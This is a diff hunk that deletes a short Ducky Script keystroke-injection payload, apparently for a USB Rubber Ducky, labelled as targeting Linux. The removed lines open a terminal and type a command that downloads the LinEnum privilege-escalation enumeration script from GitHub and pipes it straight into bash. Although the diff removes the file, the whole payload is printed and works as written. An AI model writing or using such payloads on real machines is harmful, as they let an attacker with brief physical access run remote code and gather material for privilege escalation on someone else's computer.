@@ -1,9 +1,0 @@
-REM FalsePhilosopher
-REM WIP
-REM Target linux
-DELAY 300
-CTRL-ALT+t
-DELAY 1000
-STRING curl -s -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
-DELAY 300
-ENTER
